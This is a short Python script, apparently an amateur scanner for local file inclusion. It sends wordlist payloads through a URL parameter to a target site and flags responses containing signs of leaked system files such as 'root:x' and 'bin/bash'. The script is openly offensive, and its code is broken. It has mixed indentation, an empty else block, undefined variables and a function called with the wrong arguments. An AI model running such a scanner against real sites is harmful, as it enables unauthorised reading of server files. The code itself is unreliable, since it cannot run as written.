#!/usr/bin/python3

import requests

#Add default payloads
def wordlist(wordlist):
	try:	
		with open(wordlist) as f:
			for payload in wordlist:
				return [line.strip() for line in f if line.strip()]
	except FileNotFoundError:
		print("-Wordlist Not Found")


def output_response():
	indicators = [
        "root:x", "bin/bash", "[extensions]", "[fonts]",
        "Fatal error", "Warning:", "No such file", "failed to open stream"
    ]
#ADD MORE INDICATORS 

    return(i.lower() in response_text.lower() for i in indicators)


def lfi_test(url,param,payload):
	print(f"-Starting to test lfi on {param}")
	url = f"{url}?{param}={payload}"
	try:
		response = requests.get(url,timeout=5)
		if output_response(response):
			print(f"-> Postive response {payload}")
		else:
	except requests.exceptions.RequestException as e:
		print(f"error {e}")


if __name__ == "__main__":
	target = input("url").strip()
	param = input("param").strip()
	wordlist_load = input("wordlist_path").strip()
	payloads = wordlist(wordlist_load)
	lfi_test(target,param,payload)